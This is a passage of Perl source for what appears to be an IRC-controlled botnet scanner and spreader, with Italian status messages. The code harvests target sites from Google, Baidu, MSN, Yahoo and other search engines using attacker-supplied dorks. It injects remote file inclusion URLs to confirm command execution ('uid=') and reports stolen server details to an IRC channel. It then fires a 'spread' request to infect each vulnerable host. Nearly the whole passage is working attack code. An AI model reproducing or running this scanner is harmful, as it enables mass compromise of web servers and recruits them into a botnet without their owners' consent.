      }
  }
     }
     exit;
 }
    }


    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @gnllist = &gnl($dork);
  push( my @tot, @gnllist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Google NL 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Google  NL ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1GOOGLE NL ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1GOOGLE NL");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @geslist = &ges($dork);
  push( my @tot, @geslist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Google ES 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Google ES ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1GOOGLE ES ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1GOOGLE ES");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

    if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @baidulist = &baidu($dork);
  push( my @tot, @baidulist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Baidu 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Baidu ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1Baidu ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1Baidu");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }

      if ( $line =~ /PRIVMSG $channel :$command\s+(.*?)\s+(.*)/ ) {
 if ( my $pid = fork ) {
     waitpid( $pid, 0 );
 }
 else {
     if (fork) {
  exit;
     }
     else {
  my $bug= $1;
  my $dork      = $2;
  my $contatore = 0;
  my %hosts;
my @grulist = &gru($dork);
  push( my @tot, @grulist );
  my @puliti = &unici(@tot);
  display( $dsp, "PRIVMSG $channel :4,14?8?12? Google RU 9 ".scalar(@tot)." puliti ".scalar(@puliti)." con 4$dork" );
  my $uni = scalar(@puliti);

  foreach my $site (@puliti) {
      $contatore++;
      if ( $contatore % 100 == 0 ) {
      }
      if ( $contatore == $uni - 1 ) {
   display( $dsp, "PRIVMSG $channel :4,14?8?12? Google RU ha terminato di scannare .. sto exploitando/spreadando su  $dork");
      }
my $test  = "http://".$site.$bug.$id."?";
my $print = "http://".$site.$bug.$irccmd."?";
      my $req   = HTTP::Request->new( GET => $test );
      my $ua    = LWP::UserAgent->new();
$ua->agent('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6');
      $ua->timeout(5);
      my $response = $ua->request($req);
      if ( $response->is_success ) {
   my $re = $response->content;
   if ( $re =~ /Osirys/ && $re =~ /uid=/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :12,1GOOGLE RU");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8OFF 12:9 $print ");

my $test2 =
"http://" . $site . $bug . $spread . "?";
my $reqz = HTTP::Request->new( GET => $test2 );
my $ua = LWP::UserAgent->new();
my $response = $ua->request($reqz);

}
   }
   elsif ( $re =~ /Osirys/ ) {
my $hs = geths($print);
$hosts{$hs}++;
if ( $hosts{$hs} == "1" ) {
$x = os($test);
 ( $type, $space ) = split( /\,/, $x );
sleep(4);
display( $dsp, "PRIVMSG $channel :4,1GOOGLE RU");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Version9 $Os 12: SafeMode 4ON 12:9 $print ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uname:9 $un ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Id:9 $id1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Uptime:9 $up ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Space: Total:9 $all 12Free:9 $free 12Used:9 $used ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Director:9 $pwd1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Addr:9 $ip1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Server Name:9 $name1 ");
display( $dsp, "PRIVMSG $channel :4?8?12? 12,1Software:9 $php1 ");
display( $dsp, "PRIVMSG $admin   :4?8?12? 12,1Version9 $Os 12: SafeMode 8ON 12:9 $print ");

}
   }
      }
  }
     }
     exit;
 }
    }


sub display() {
    if ( $#_ == '1' ) {
 my $dsp = $_[0];
 print $dsp "$_[1]\n";
    }
    else {
 print $dsp "$_[0]\n";
    }
}

sub os() {
    my $site = $_[0];
    my $Res  = query($site);
    while ( $Res =~ m/<br>uname -a:(.+?)\<br>/g ) {
 $un = $1;
    }
    while ( $Res =~ m/<br>uptime:(.+?)\<br>/g ) {
 $up = $1;
    }
    while ( $Res =~ m/<br>id:(.+?)\<br>/g ) {
 $id1 = $1;
    }
    while ( $Res =~ m/<br>pwd:(.+?)\<br>/g ) {
 $pwd1 = $1;
    }
    while ( $Res =~ m/<br>php:(.+?)\<br>/g ) {
 $php1 = $1;
    }
    while ( $Res =~ m/<br>software:(.+?)\<br>/g ) {
 $sof1 = $1;
    }
    while ( $Res =~ m/<br>server-ip:(.+?)\<br>/g ) {
 $ip1 = $1;
    }
    while ( $Res =~ m/<br>server-name:(.+?)\<br>/g ) {
 $name1 = $1;
    }
    while ( $Res =~ m/<br>os:(.+?)\<br>/g ) {
 $os = $1;
    }
    while ( $Res =~ m/<br>free:(.+?)\<br>/g ) {
 $free = $1;
    }
    while ( $Res =~ m/<br>used:(.+?)\<br>/g ) {
 $used = $1;
    }
    while ( $Res =~ m/<br>total:(.+?)\<br>/g ) {
 $all = $1;
    }
}

sub googlet {
my @dominios = ("ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","pt","it","co.uk","es");
my @country = ("AT","AU","BR","tw","jp","pl","ar","info","biz","cz","dk","mx","sk","pe","ee","fi","pt","se","es");
my @lang = ("en","es","de","nl","ro","it","be","fo","sv","fr","el","pt");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $i (@dominios){
my @lista = google($i,$key,$lang[$c],$country[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub google(){
my @lst;
my $i=$_[0];
my $key=$_[1];
my $lang= $_[2];
my $country =$_[3];
for($b=0;$b<=5000;$b+=100){
my $Go=("www.google.".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}



sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $i   = 0;
    my $pg  = 0;
    for ( $i = 0 ; $i <= 1000 ; $i += 100 ) {
 my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
 my $Res = query($all);
 while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
     my $k = $1;
     $k =~ s/ //g;
     my @grep = links($k);
     push( @lst, @grep );
 }
    }
    return @lst;
}


sub altavistait() {
    my @lst;
    my $key = $_[0];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
 my $AlT = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
 my $Res = query($AlT);
 while ( $Res =~ m/<span class=ngrn>(.+?)\//g ) {
     if ( $1 !~ /altavista/ ) {
  my $k = $1;
  $k =~ s/<//g;
  $k =~ s/ //g;
  my @grep = links($k);
  push( @lst, @grep );
     }
 }
 if   ( $Res =~ /target=\"_self\">Succ/ ) { }
 else     { return @lst; }
    }
    return @lst;
}


sub uolsub() {
    my @lst;
    my $key = $_[0];
    for ( $b = 0 ; $b <= 1000 ; $b += 10 ) {
 my $UoL = ("http://busca.uol.com.br/www/index.html?ref=homeuol&ad=on&y=5&q=i".key($key)."&x=6&start=".$b);
 my $Res = query($UoL);
 while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
     my $k = $1;
     if ( $k !~ /busca|uol|yahoo/ ) {
  my $k    = $1;
  my @grep = links($k);
  push( @lst, @grep );
     }
 }
    }
    return @lst;
}

sub msn() {
    my @lst;
    my $key = $_[0];
    for ( $b = 1 ; $b <= 1000 ; $b += 10 ) {
 my $MsN = ("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
 my $Res = query($MsN);
 while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
     if ( $1 !~ /msn|live/ ) {
  my $k    = $1;
  my @grep = links($k);
  push( @lst, @grep );
     }
 }
    }
    return @lst;
}

sub msn3(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
if ($Res =~ /nextPage disabled/)
{return @lst;}
}
return @lst;
}

sub yahoo() {
    my @lst;
    my $key = $_[0];
    my $num   = 100;
    my $max  = 1000;
    for($b=0;$b < 1000; $start += 100){
my $yahoo = ("http://search.yahooapis.com/WebSearchService/V1/webSearch?appid=SiteSearch&query=".key($key)."&results=".$num."&start=".$b);
 my $Res = query($yahoo);
 while ( $Res =~ m/<Url>http:\/\/(.+?)\<\/Url>/g){
     if ( $1 !~ /yahoo/ ) {
     my $k    = "$1/";
     my @grep = links($k);
     push( @lst, @grep );
 }
    }
    return @lst;
}

sub guk(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.co.uk/search?hl=gb&q=".key($key)."&num=100&&hl=en&cr=countryUK|countryGB&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub gde(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.de/search?hl=gb&q=".key($key)."&num=100&&hl=en&cr=countryDE|countryDE&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub gnl(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.nl/search?hl=nl&q=".key($key)."&num=100&&hl=en&cr=countryNL|countryNL&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub gru(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.ru/search?hl=ru&q=".key($key)."&num=100&&hl=en&cr=countryRU|countryRU&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub git(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&&hl=en&cr=countryIT|countryIT&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub gat(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.at/search?hl=at&q=".key($key)."&num=100&&hl=en&cr=countryAT|countryAT&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub ges(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.es/search?hl=es&q=".key($key)."&num=100&&hl=en&cr=countryES|countryES&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}


sub baidu(){
my @lst;
my $key = $_[0];
my $pg = 0;
    for($i=0; $i<=1000; $i+=10){
my $lib=("http://www.baidu.com/s?lm=0&si=&rn=10&ie=gb2312&ct=0&wd=".key($key)."&pn=".$start."&ver=0&cl=3");
my $Res=query($lib);
while($Res =~ m/href=\"http:\/\/(.*?)\"/ig){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub msn2() {
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.ro/search?hl=ro&q=".key($key)."&num=100&&hl=en&cr=countryRO|countryRO&=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub fireball(){
my $key=$_[0];
my $inizio=1;
my $pagine=100;
my @lst;
my $av=0;
while($inizio <= $pagine){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_web&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inizio++;
}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10){
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}

sub geths() {
    my $host = $_[0];
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    return $host;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub Agent(){
    my @ret = (
    "Microsoft Internet Explorer/4.0b1 (Windows 95)",
    "Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
    "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
    "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Microsoft Pocket Internet Explorer/0.6",
    "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
    "MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
    "Advanced Browser (http://www.avantbrowser.com)",
    "Avant Browser (http://www.avantbrowser.com)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
    "Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
    "Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
    "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
